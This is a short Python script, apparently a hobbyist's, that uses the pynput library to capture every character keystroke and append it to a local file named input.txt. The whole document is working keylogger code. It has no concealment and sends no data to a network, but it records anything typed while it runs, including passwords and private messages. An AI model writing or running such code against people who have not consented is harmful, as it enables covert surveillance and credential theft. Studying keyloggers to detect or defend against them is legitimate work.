from pynput import keyboard

def keyPress(key):
    # print(str(key))   used for testing purposes in terminal so i know its recording the keys correctly
    with open("input.txt", "a") as myfile:
        try:
            char=key.char
            myfile.write(char)
        except:
            print("error recording key")

if __name__ == "__main__":
    listener = keyboard.Listener(on_press=keyPress)
    listener.start()
    input()
